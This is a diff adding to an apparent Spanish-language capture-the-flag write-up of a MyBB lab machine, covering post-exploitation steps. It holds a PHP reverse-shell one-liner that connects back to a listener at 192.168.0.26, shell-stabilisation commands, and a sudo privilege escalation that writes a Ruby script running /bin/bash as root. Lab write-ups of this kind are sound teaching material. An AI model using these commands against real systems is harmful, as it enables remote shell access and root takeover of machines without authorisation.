@@ -106,3 +106,57 @@ python3 exploit.py http://panel.mybb.dl/ admin babygirl
 
 nos conectaremos ala maquina victiima aremos un tratamiento de shell
 
+```
+script /dev/null -c bash 
+CTRL + Z 
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+```
+
+nos pondremos en escucha con NC en otra terminal, manderemos un revershell con php y reciviermos la conexion en otro terminal
+
+```ruby
+php -r '$sock=fsockopen("192.168.0.26",443);shell_exec("bash <&3 >&3 2>&3");'
+```
+
+
+comprobamos que si llego y aremos un sudo alice ya que tenemos las credenciales anteriormente 
+```ruby
+www-data@caab0e34ad54:/var/www/mybb$ su alice
+Password:
+alice@caab0e34ad54:/var/www/mybb$
+```
+
+comprobaremos los permisos de sudo 
+
+```ruby 
+alice@caab0e34ad54:/var/www/mybb$ sudo -l
+Matching Defaults entries for alice on caab0e34ad54:
+	env_reset, mail_badpass,
+	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+	use_pty
+
+User alice may run the following commands on caab0e34ad54:
+	(ALL : ALL) NOPASSWD: /home/alice/scripts/*.rb
+
+```
+
+en el usuario puede aprovechar de ejecutar cualquier script, el script Ruby (*.rb) como root sin necesidad de contraseña
+
+
+Creamos un script en Ruby en el directorio /scripts
+```ruby
+echo 'exec "/bin/bash"' > /home/alice/scripts/root.rb
+Le otorgamos permisos
+chmod +x root.rb
+```
+ejecutamos el script y ya seremos root
+
+```bash 
+alice@caab0e34ad54:~/scripts$ sudo /home/alice/scripts/root.rb
+root@caab0e34ad54:/home/alice/scripts# whoami
+root
+```
